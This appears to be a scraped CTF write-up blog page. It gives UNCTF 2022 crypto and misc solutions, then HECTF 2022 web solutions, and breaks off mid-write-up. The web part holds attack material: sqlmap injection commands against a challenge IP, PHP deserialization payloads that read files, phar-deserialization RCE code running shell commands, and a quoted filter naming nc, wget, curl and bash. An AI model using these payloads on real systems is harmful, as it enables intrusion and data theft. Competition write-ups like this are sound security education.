&#x27;&#x27;&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d2160631d325b3b421c310601453c190814162d37404510041b55490d5d3060631d325b3e59033a1252102c560207103b22020613450549444f5d3420277421122f55067f1207152f19170659282b090b56121701405318212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a75222a22230877102137045212300409165928264c091f131701484f5d21272d33661237441a7f005215331706175930254c0817091b4244011c303c2674311e795e103a05520d300600521831274c031f0b160148555d3c3d63232909355455300752033a17175e59372c1c0056111d01474813752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)def strxor(a, b): return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher): print &#x27;-------begin-------&#x27; final_key = [None]*150 known_key_positions = set() for current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() for index, ciphertext2 in enumerate(ciphers): if current_index != index: for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 knownSpaceIndexes = [] for ind, val in counter.items(): if val &gt;= 7: knownSpaceIndexes.append(ind) xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150) for index in knownSpaceIndexes: final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;) known_key_positions.add(index) final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key]) output = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;)) print &quot;Fix this sentence:&quot; print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\\n&quot; print &#x27;------end------&#x27; for i in ciphers: target_fix(i) 补全可能的明文单词，反复尝试得到key：UNCTF&#123;Y0u_are_very_Clever!!!&#125;。 ​ 今晚吃什么 全部大写 10000 换 A，00000 换 B，培根密码解得 CRYPROISFUN。 ​ Today_is_Thursday_V_me_50按代码逻辑还原即可。 1234567891011121314151617181920212223242526272829import randomimport itertoolsfrom Crypto.Util.number import *from Crypto.Util.strxor import strxorname = &quot;unctf&quot;key1 = b&#x27;Today_is_Thursday_V_me_50&#x27;key1_num = bytes_to_long(key1)c = b&#x27;Q\\x19)T\\x18\\x1b(\\x03\\t^c\\x08QiF&gt;Py\\x124DNg3P&#x27;random.seed(key1_num)message = b&#x27;&#x27;for i in c: temp_num = random.randint(1,128) message += long_to_bytes(temp_num ^ i)guess = [i for i in itertools.permutations(name, 5)]for i in range(4): what = guess.pop(50)name = &#x27;&#x27;.join(j for j in what)mask = strxor(5*name.encode(),key1)print(mask)out = strxor(mask,message)print(out)# b&#x27;unctf&#123;1_l0ve_Thurs4Ay!!!&#125;&#x27; ​ Fermat已知 $g+x=x \\cdot p$，则 $g=x(p-1)$，结合费马小定理，有 $a^g \\bmod p = a^{ x(p-1)} \\bmod p = (a^x)^{(p-1)} \\bmod p = 1$ （$a$ 为任意整数） 取 $a=2$，即 $2^g \\bmod p = 1$，$2^g-1=k_1p$， 而 $2^g \\bmod p = (2^g \\bmod n) \\bmod p=1$，则 $2^g \\bmod n = 1+k_2p$， 故 $(2^g \\bmod n)-1=k_2p$ 也是 $p$ 的倍数，则有 $p=\\gcd\\Big((2^g \\bmod n)-1,n\\Big)$。 12345678910111213n = 19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259c = 388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059g = 28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160e = 0x10001p = gcd(pow(2,g,n)-1,n)q = n//pf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27; ​ 超级加倍根据”加倍“，脑洞大猜小指数 $e$ 攻击，开方即可。 123456import gmpy2c=364948328635256862807658970246807356738683637564484151183420122283833769442806688034764747801289594899501872549412387392353830842750341246881725380294423193634163908298756097744423833369487321345708403908358587818931161805853745707954962941881920962518131654701890269025702523666873057795301975752113492236398361724355733200822450695761m=gmpy2.iroot(c,4)[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;it_is_much_bigger_than_before&#125;&#x27; ​ EZcry 提示1：流密码 密文：dd9f58b37289edc2c40133ab9f0439c140aafe7cfd501f8c3d79b1856c9bda598ce34a02a57c， key：12345678 根据提示测试常见流密码，RC4成功解出 flag&#123;83e429d991d24c548b9dbd256975d0d5&#125;。 ​ easy_lfsr 你能求出我的mask吗 根据512级LFSR连续1024个bit的产出，求掩码。 由于LFSR的性质，每一次生成的bit都会加到向量的最低位，同时丢弃掉最高位bit。于是在连续512次生成之后，原有的 KEY 所有的位都被丢弃，LFSR的状态会转为已知的512个bit，即所给出的串的前512位。之后完全知道了LFSR的状态，只需要在已知状态的情况下推出掩码。 每连续512个bit可以生成下一个bit。已知这512个 bit，也知道下一个bit，但掩码未知。问题等价于：在 $\\text{GF}(2)$ 上，512位的已知的状态向量，点乘512位的掩码向量，得到的数已知，求掩码向量。状态向量有512维，则有512组方程。 解方程组的问题转化为矩阵求逆问题。把LFSR状态逐行写在矩阵上，形成的矩阵记为 $M$，把LFSR每次所生成的结果拼成的向量记为 $T$，则掩码向量 $v$ 有：$M \\cdot v = T$，即 $v=M^{-1} \\cdot T$。 123456789101112131415161718192021222324import itertoolsr1 = 1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446r2 = 1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757def test(): s = [int(x) for x in bin(r1)[2:].rjust(512,&#x27;0&#x27;)+bin(r2)[2:].rjust(512,&#x27;0&#x27;)] M = matrix(GF(2), 512, 512) T = vector(GF(2), 512) for i in range(len(s) - 512): M[i] = s[i : i + 512] T[i] = s[i+512] try: mask = M.inverse() * T return int(&#x27;&#x27;.join(map(str, (mask))),2) except: return flag = test()print(bytes.fromhex(hex(flag)[2:]))# b&quot;flag&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;\\xb0vgf\\x96\\xdf`v\\xc6d@\\x14\\xf7\\x98\\xaf\\xac&#x27;\\xf8K\\xbb+\\x00&quot; ​ # Miscmagic_word 乱码+零宽隐写 Wingdings字体转正常字体如宋体，全选内容复制，零宽隐写工具提取得 unctf&#123;We1come_new_ctfer&#125;。 ​ 找得到我吗以压缩包方式打开docx，在document.xml中发现： &lt;w:rFonts w:hint=&quot;default&quot; w:cs=&quot;flag&#123;You_find_me!&#125;&quot; w:asciiTheme=&quot;minorAscii&quot; w:hAnsiTheme=&quot;minorAscii&quot;/&gt; ​ syslog在log文件中找到关键一行： Nov 2 02:34:14 ubuntu bi0x: [Password] cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA== base64解码得到密码 password is U6nu2_i3_b3St，解压得flag：unctf&#123;N1_sH3_D0n9_L0g_dE!&#125; ​ In_the_Morse_GardenPDF中全选复制出文字： 1234567891011121314UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaE=&#125; 中间部分base64解码得到的 依古比古 换为 .，玛卡巴卡 换为 -，再摩斯密码解得 WAN_AN_MAKA_BAKAAAAA!。 ​ 清和fan 小w一直对真人二次元没啥抵抗力，当他见到清和的时候，小w直呼这就是心动的感觉。 第一层，根据压缩包注释，密码为清和B站uid下划线最高播放量视频发布日期，找到密码 836885_2022/05/20； 第二层，png图片LSB隐写，提取出 password is :qq857488580； 第三层，音频文件SSTV，得到图片中密码 V@mpir3； 最后一层，文本内零宽隐写，用在线工具提取得到 unctf&#123;wha1e_wants_a_girlfriend_like_alicia&#125;。 ​ 芝麻开门带密码的LSB隐写：python2 lsb.py extract flag.png xxx.txt key1 flag: flag&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125; ​ 我小心海也绝非鳝类png图片中有字符串 F#S&lt;YIcHnAG;，base92解码 flaginmd5；尾部 RUFTWUxTQg==，base64解码 EASYLSB。 zsteg查看不到有用信息，用cloaked-pixel带密码的LSB提取：python2 lsb.py extract 1.png out.txt flaginmd5，得到： 18FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF 根据前面的提示，这串字符串为md5值的组合，爆破： 12345678910111213141516from hashlib import md5s = &#x27;8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF&#x27;.lower()s = [s[32*i:32*i+32] for i in range(len(s)//32)]dic = &#123;&#125;for k in range(32,127): dic[md5(chr(k).encode()).hexdigest()] = chr(k)flag = &#x27;&#x27;for k in s: flag += dic[k]print(flag)# flag&#123;welcome_to_misc&#125; ​ MY PICTURE将dat文件异或0x8e，解压得到encode.py，内为图片加密算法，逻辑为逐像素RGB值简单异或，还原即可： 12345678910111213141516from PIL import Imagec = Image.open(r&#x27;flag.png&#x27;,&#x27;r&#x27;)l,h = c.sizeprint(l,h)m = Image.new(&#x27;RGB&#x27;,(h,l))for i in range(l): for j in range(h): r1,g1,b1 = c.getpixel((i,j)) r = g1^b1 g = r1^r b = g1^g m.putpixel(((i*1200+j)//787,(i*1200+j)%787),(b,g,r))m.save(r&#x27;flag.jpg&#x27;)c.close()m.close() 还原图片中的flag：UNCTF&#123;93bb442f-2a76-2b6f-c42f-c2297f5fdaf9&#125;。 ​ 贝斯家族的侵略 提示1：如果明文攻击失败，尝试使用bandzip 提示2：会动的鼠标 第一层，根据提示1，bandzip压缩后明文攻击，解压； 第二层，base64隐写，脚本提取隐写内容： 123456789101112# -*- coding: utf-8 -*-b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f: bin_str = &#x27;&#x27; for line in f.readlines(): stegb64 = &#x27;&#x27;.join(line.split()) rowb64 = &#x27;&#x27;.join(stegb64.decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).split()) offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])) equalnum = stegb64.count(&#x27;=&#x27;) #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])) #8 位一组 得到的内容16进制转字符串，得到一个文件； 第三层，根据文件内的提示 Macro.mrf，猜测为鼠标轨迹记录，使用Macro Recorder工具打开，逐条查看轨迹得到flag：flag&#123;b4s3_1s_v3ry_g0od!!&#125;。 ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2022 HECTF","slug":"match-2022-HECTF","date":"2022-11-07T13:38:28.000Z","updated":"2022-11-28T16:24:14.457Z","comments":true,"path":"2022/11/07/match-2022-HECTF/","link":"","permalink":"https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/","excerpt":"","text":"​ 2022HECTF是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，是面向全国大学生的一次竞技活动。 Rank: 1 Web迷路的小狮 签到题 HINTS: 官网地址需填写完整(建议复制)，无路径即结尾为.cn 进入是迷惑性的404页面，且右键和F12禁用，地址栏手动添加 view-source: 看到源码提示 hectfer。 访问 /hectfer 提示 hebnu is a good site.，访问 /hebnu 提示 Can you use another way of requesting? 上burpsuite，按提示按步骤修改request header的几处为： 1234POST /hebnu HTTP/1.1User-Agent: Internet ExplorerReferer: https://www.hebtu.edu.cnX-Forwarded-For: 127.0.0.1 在responce header里看到PHPFuck代码，控制台运行直接得到flag：HECTF&#123;sfe2fsa_f39sjfa_hj93sf_ef0skf3fs&#125;。 ​ 擎天注找到GET参数id，用sqlmap可以直接通过时间盲注跑出flag。 命令： 12345678# 爆数据库名sqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; --dbs# 数据库名ctf，爆表名sqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; -D ctf --tables# 数据库名ctf，表名3eDf4f07efC9ee16，爆列名和内容sqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; -D ctf -T 3eDf4f07efC9ee16 --columns --dump ​ easy_unserialize 一道神奇的反序列化题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phperror_reporting(0);class A&#123; public $file; public function __construct()&#123; echo &quot;Welcome to HECTF Have fun!!!😊&lt;br&gt;&quot;; &#125; public function __wakeup()&#123; if(isset($this-&gt;file-&gt;var))&#123; $this-&gt;file = &quot;flag.php&quot;; &#125; else&#123; $this-&gt;file = &quot;index.php&quot;; &#125; &#125; public function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;class B&#123; public $str; public $huang; public function __isset($arg) &#123; echo &quot;难道我真的要失败了，吗&quot;.$this-&gt;str; &#125; public function __call($fun1,$arg) &#123; return $this-&gt;huang-&gt;str; &#125;&#125;class C&#123; public $eee; public $aaa=&quot;who are you?&quot;; public $ccc; public function __toString() &#123; $this-&gt;eee-&gt;flag(); &#125; public function __get($css) &#123; $function = $this-&gt;ccc; return $function(); &#125;&#125;class D&#123; private $ddd; private $ext; public function flag()&#123; $this-&gt;ext-&gt;nisa($this-&gt;ddd); &#125; public function __invoke() &#123; echo new $this-&gt;ddd($this-&gt;ext); &#125;&#125;$gagaga = new A();unserialize(serialize($gagaga));$data = $_POST[&#x27;data&#x27;];unserialize($data); 构造反序列化链： A:__wakeup() =&gt; B:__isset() =&gt; C:__toString() =&gt; D:flag() =&gt; B:__call() =&gt; C:__get() =&gt; D:__invoke() =&gt; echo new() 利用内置类 DirectoryIterator + glob://伪协议列目录： 12345678910111213141516171819202122232425262728293031323334353637from phpserialize import serializefrom urllib.parse import quoteclass D: private_ddd = &#x27;DirectoryIterator&#x27; private_ext = &#x27;glob:///*f*&#x27; class C: public_ccc = D() public_eee = &#x27;?&#x27; public_aaa = &#x27;?&#x27; class B: public_str = &#x27;?&#x27; public_huang = C() class D: private_ddd = &#x27;?&#x27; private_ext = B()class C: public_ccc = &#x27;?&#x27; public_eee = D() public_aaa = &#x27;?&#x27;class B: public_str = C() public_huang = &#x27;?&#x27; class A: public_file = B()print(quote(serialize(A())))# POST payload:# data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A17%3A%22DirectoryIterator%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A11%3A%22glob%3A///%2Af%2A%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D# 文件名 /ffflllllaaaaaaggggg.txt 再利用内置类 SplFileObject + php://filter伪协议读文件内容： 1234567891011121314151617181920212223242526272829303132333435363738from phpserialize import serializefrom urllib.parse import quoteclass D: private_ddd = &#x27;SplFileObject&#x27; private_ext = &#x27;php://filter/read=convert.base64-encode/resource=/ffflllllaaaaaaggggg.txt&#x27; class C: public_ccc = D() public_eee = &#x27;?&#x27; public_aaa = &#x27;?&#x27; class B: public_str = &#x27;?&#x27; public_huang = C() class D: private_ddd = &#x27;?&#x27; private_ext = B()class C: public_ccc = &#x27;?&#x27; public_eee = D() public_aaa = &#x27;?&#x27;class B: public_str = C() public_huang = &#x27;?&#x27; class A: public_file = B()print(quote(serialize(A())))# POST payload# data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A73%3A%22php%3A//filter/read%3Dconvert.base64-encode/resource%3D/ffflllllaaaaaaggggg.txt%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D# HECTF&#123;u_find_m# y_trulyself&#125; ​ cute_pipi观察页面，有图片上传点，url发现存在文件包含，利用伪协议读源码： index.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phperror_reporting(0);define(&#x27;FROM_INDEX&#x27;, 1);include(&#x27;class.php&#x27;);$file=$_POST[&#x27;file&#x27;];$show = empty($_GET[&#x27;show&#x27;]) ? &#x27;home&#x27; : $_GET[&#x27;show&#x27;];if(!is_string($show) || preg_match(&#x27;/\\.\\./&#x27;, $show) || preg_match(&#x27;/zip/i&#x27;,$show)) die(&#x27;Not this !!!&#x27;);ob_start(&#x27;ob_gzhandler&#x27;);function page_tshow($show) &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div id=&quot;header&quot;&gt; &lt;center&gt;&lt;a href=&quot;?show=home&quot; class=&quot;logo&quot;&gt;&lt;img src=&quot;images/logo.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/center&gt; &lt;/div&gt; &lt;div id=&quot;body&quot;&gt;&lt;?php&#125;function fatal($msg) &#123;?&gt;&lt;div class=&quot;article&quot;&gt;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;&lt;/div&gt;&lt;?phpexit(1);&#125;page_tshow($show);if(!(include $show . &#x27;.php&#x27;)) fatal(&#x27;no no no&#x27;);if(isset($file))&#123; if(file_exists($file)) echo $file.&quot; surely exists&quot;; else echo $file.&quot; dont exist&quot;;&#125;?&gt; home.php 12345678910111213&lt;?phpinclude &#x27;common.php&#x27;;?&gt;&lt;center&gt;&lt;div class=&quot;article&quot;&gt; &lt;h2&gt;Welcome to HECTF ！！！&lt;/h2&gt; &lt;p&gt; Click here to upload your file =&gt; &lt;a href=&quot;?show=upload&quot;&gt;传送门&lt;/a&gt; &lt;/p&gt;&lt;/div&gt;&lt;/center&gt; upload.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpinclude &#x27;common.php&#x27;;if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; isset($_FILES[&#x27;image&#x27;])) &#123; $fn = $_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;]; $ft = $_FILES[&#x27;image&#x27;][&#x27;type&#x27;]; if(!is_uploaded_file($fn)) &#123; fatal(&#x27;uploaded file corrupted&#x27;); &#125; $array = array(&#x27;image/png&#x27;); if(!in_array($ft,$array))&#123; fatal(&quot;No, I want png picture ᵕ᷄ι ̠ᵕ᷅&quot;); &#125; $imagekey = create_image_key(); move_uploaded_file($fn, &quot;uploads/$imagekey.png&quot;); header(&quot;Location: ?show=show&amp;imagekey=$imagekey&quot;);&#125; else &#123;?&gt;&lt;center&gt;&lt;div class=&quot;article&quot;&gt; &lt;h2&gt;Plz Give me a file I want.&lt;/h2&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;?show=upload&quot; method=&quot;POST&quot;&gt; &lt;label for=&quot;image&quot;&gt;ᵕ᷄ι ̠ᵕ᷅ &lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;image&quot; name=&quot;image&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Upload&quot; /&gt; &lt;/form&gt;&lt;/div&gt;&lt;/center&gt;&lt;?php&#125;?&gt; common.php 123456789101112131415161718192021&lt;?phpif(!defined(&#x27;FROM_INDEX&#x27;)) die();define(&#x27;MAX_IM_SIZE&#x27;, 100);function create_image_key() &#123; return sha1($_SERVER[&#x27;REMOTE_ADDR&#x27;] . $_SERVER[&#x27;HTTP_USER_AGENT&#x27;] . time() . mt_rand());&#125;function load_image($imagekey) &#123; if(1 !== preg_match(&#x27;/[0-9a-f]&#123;40&#125;/&#x27;, $imagekey)) &#123; fatal(&#x27;Invalid image key.&#x27;); &#125; $im = imagecreatefrompng(&quot;uploads/&#123;$imagekey&#125;.png&quot;); if(!$im) &#123; fatal(&#x27;Failed to load image.&#x27;); &#125; return $im;&#125;?&gt; class.php 12345678910111213&lt;?phpclass HeCTF&#123; public $hectf; public $cmd; public function __destruct()&#123; if( isset($this-&gt;hectf) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;,$this-&gt;hectf) &amp;&amp; intval($this-&gt;hectf)) if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;, $this-&gt;cmd))&#123; die(&#x27;No no no no no!&#x27;); &#125; exec($this-&gt;cmd); &#125;&#125; 审计源码，图片上传点+file_exists()函数+自定义HeCTF类，判断为文件上传+phar反序列化利用。 HeCTF类中RCE使用 tee 命令绕过过滤写文件。 构造phar文件： 12345678910111213141516&lt;?phpclass HeCTF&#123; public $hectf; public $cmd;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $o = new HeCTF(); $o-&gt;hectf = array(&#x27;x&#x27;);$o-&gt;cmd = &#x27;ls / | tee 1&#x27;;$phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); 将生成的phar文件改为png后缀上传，在index.php以POST方式传入file值，利用phar伪协议反序列化RCE： POST: file=phar://uploads/25c3a34d93227241d5dacc8eb84a80ef2aabeab1.png 读到flag文件名 /ffflllllaaaaggg，同样操作构造读flag内容的phar文件： 12345678910111213141516&lt;?phpclass HeCTF&#123; public $hectf; public $cmd;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $o = new HeCTF(); $o-&gt;hectf = array(&#x27;x&#x27;);$o-&gt;cmd = &#x27;cat /ffflllllaaaaggg | tee 1&#x27;;$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ​ 皮扣的商店进入页面发现可以点击按钮，但是没钱可用，点击时发现cookie是变化的。 cookie像base64，解码，结合题目可知为json的pickle序列化结果，反推一下： 12345678import picklefrom base64 import *enc = &quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;print(pickle.loads(b64decode(enc)))# &#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125; 